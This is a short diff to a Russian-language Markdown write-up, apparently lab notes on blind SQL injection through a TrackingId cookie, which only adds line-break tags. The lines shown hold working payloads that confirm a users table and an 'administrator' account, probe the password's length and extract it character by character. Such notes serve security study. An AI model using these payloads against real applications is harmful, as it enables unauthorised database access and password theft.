@@ -165,8 +165,8 @@ Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND SUBSTRING((SELECT Password FROM Use
   
 #### Также можно проверить наличие таблиц и пользователя
 
-- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT 'a' FROM users LIMIT 1)='a **(Убедитесь, что условие выполняется, и подтвердите наличие таблицы с именем users.)**
-- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT 'a' FROM users WHERE username='administrator')='a **(Убедитесь, что условие выполняется, и подтвердите, что существует пользователь с именем administrator**)
+- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT 'a' FROM users LIMIT 1)='a<br> **(Убедитесь, что условие выполняется, и подтвердите наличие таблицы с именем users.)**
+- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT 'a' FROM users WHERE username='administrator')='a<br> **(Убедитесь, что условие выполняется, и подтвердите, что существует пользователь с именем administrator**)
 
 ### определение кол-во символов в пароле
 - Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=&1&)='&a&<br>
